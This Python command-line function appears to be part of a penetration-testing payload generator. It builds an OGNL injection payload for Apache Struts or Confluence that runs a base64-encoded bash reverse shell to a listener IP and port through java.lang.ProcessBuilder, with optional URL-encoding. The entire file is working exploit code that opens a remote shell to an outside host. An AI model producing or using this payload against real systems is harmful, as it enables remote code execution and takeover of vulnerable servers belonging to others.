import click
from colorama import Fore
from urllib.parse import quote
import base64

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
def command(listener_ip, listener_port, raw, urlencode):
    """Return OGNL reverse shell (e.g. for Struts/Confluence)"""
    inner = f"bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'"
    b64 = base64.b64encode(inner.encode()).decode()
    cmd = (f"(#a='echo {b64} | base64 -d | bash -i')."
           f"(#b={{'bash','-c',#a}})."
           f"(#p=new java.lang.ProcessBuilder(#b))."
           f"(#process=#p.start())")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}OGNL reverse shell:\n\t{Fore.WHITE}{cmd}")
        click.secho(f"{Fore.LIGHTGREEN_EX}Decoded payload:\n\t{Fore.WHITE}{inner}")
    else:
        click.secho(cmd, nl=False)
